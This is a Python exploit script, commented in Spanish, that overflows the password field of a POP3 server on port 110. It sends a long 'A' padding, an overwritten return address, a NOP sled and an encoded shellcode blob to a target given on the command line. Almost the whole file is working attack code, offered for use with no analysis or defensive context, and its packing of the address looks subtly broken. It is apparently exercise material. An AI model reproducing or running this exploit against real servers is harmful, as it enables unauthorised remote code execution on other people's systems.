
from struct import pack
import socket, sys

if len(sys.argv) < 2:
    print("\n[*] Uso: python " + sys.argv[0] + " <ip-address>\n")
    sys.exit(0)

#Variables
ip_address = sys.argv[1]
remote_port = 110

shellcode=("\xb8\x4a\x9f\x98\xfc\xd9\xe8\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x42\x12\x83\xea\xfc\x03\x08\x91\x7a\x09\x70\x45\xf8"
"\xf2\x88\x96\x9d\x7b\x6d\xa7\x9d\x18\xe6\x98\x2d\x6a\xaa\x14"
"\xc5\x3e\x5e\xae\xab\x96\x51\x07\x01\xc1\x5c\x98\x3a\x31\xff"
"\x1a\x41\x66\xdf\x23\x8a\x7b\x1e\x63\xf7\x76\x72\x3c\x73\x24"
"\x62\x49\xc9\xf5\x09\x01\xdf\x7d\xee\xd2\xde\xac\xa1\x69\xb9"
"\x6e\x40\xbd\xb1\x26\x5a\xa2\xfc\xf1\xd1\x10\x8a\x03\x33\x69"
"\x73\xaf\x7a\x45\x86\xb1\xbb\x62\x79\xc4\xb5\x90\x04\xdf\x02"
"\xea\xd2\x6a\x90\x4c\x90\xcd\x7c\x6c\x75\x8b\xf7\x62\x32\xdf"
"\x5f\x67\xc5\x0c\xd4\x93\x4e\xb3\x3a\x12\x14\x90\x9e\x7e\xce"
"\xb9\x87\xda\xa1\xc6\xd7\x84\x1e\x63\x9c\x29\x4a\x1e\xff\x25"
"\xbf\x13\xff\xb5\xd7\x24\x8c\x87\x78\x9f\x1a\xa4\xf1\x39\xdd"
"\xcb\x2b\xfd\x71\x32\xd4\xfe\x58\xf1\x80\xae\xf2\xd0\xa8\x24"
"\x02\xdc\x7c\xea\x52\x72\x2f\x4b\x02\x32\x9f\x23\x48\xbd\xc0"
"\x54\x73\x17\x69\xfe\x8e\xf0\x9c\xff\x92\x14\xc9\xfd\x92\x15"
"\xb2\x8b\x74\x7f\xd4\xdd\x2f\xe8\x4d\x44\xbb\x89\x92\x52\xc6"
"\x8a\x19\x51\x37\x44\xea\x1c\x2b\x31\x1a\x6b\x11\x94\x25\x41"
"\x3d\x7a\xb7\x0e\xbd\xf5\xa4\x98\xea\x52\x1a\xd1\x7e\x4f\x05"
"\x4b\x9c\x92\xd3\xb4\x24\x49\x20\x3a\xa5\x1c\x1c\x18\xb5\xd8"
"\x9d\x24\xe1\xb4\xcb\xf2\x5f\x73\xa2\xb4\x09\x2d\x19\x1f\xdd"
"\xa8\x51\xa0\x9b\xb4\xbf\x56\x43\x04\x16\x2f\x7c\xa9\xfe\xa7"
"\x05\xd7\x9e\x48\xdc\x53\xae\x02\x7c\xf5\x27\xcb\x15\x47\x2a"
"\xec\xc0\x84\x53\x6f\xe0\x74\xa0\x6f\x81\x71\xec\x37\x7a\x08"
"\x7d\xd2\x7c\xbf\x7e\xf7")

if __name__ == '__main__':
    buffer = "A"*2606 + str(pack("<L", 0x5f4a358f)) + "\x90"*16 + shellcode #Desplazamos la pila para que pueda interpretar el shellcode

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, remote_port))

        s.recv(1024)

        s.send("USER fernando\r\n")
        s.recv(1024)
        s.send("PASS " + buffer + '\r\n')
        s.recv(1024)

        s.close()
    except:
        print("\n[!] Error de conexiÃ³n\n")